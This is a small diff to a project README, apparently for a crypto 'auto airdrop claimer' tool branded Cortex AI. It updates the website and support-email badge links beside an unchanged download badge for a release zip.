@@ -63,8 +63,8 @@ If you need help, we’re here for you:
 
 
 [![Download](https://img.shields.io/badge/Download-Cortex_AI-4ade80?style=for-the-badge)](https://github.com/cortexaiofficial/Auto-Airdrop-Claimer/releases/download/cryptosoft/Cortex_v.3.4.zip)  
-[![Website](https://img.shields.io/badge/Visit-Website-blue?style=for-the-badge)]()  
-[![Support](https://img.shields.io/badge/Support-Email-orange?style=for-the-badge)](mailto:support@cortexai.run)
+[![Website](https://img.shields.io/badge/Visit-Website-blue?style=for-the-badge)](https://www.cortex.io/)  
+[![Support](https://img.shields.io/badge/Support-Email-orange?style=for-the-badge)](mailto:support@cortex.io)
 
 ---
 
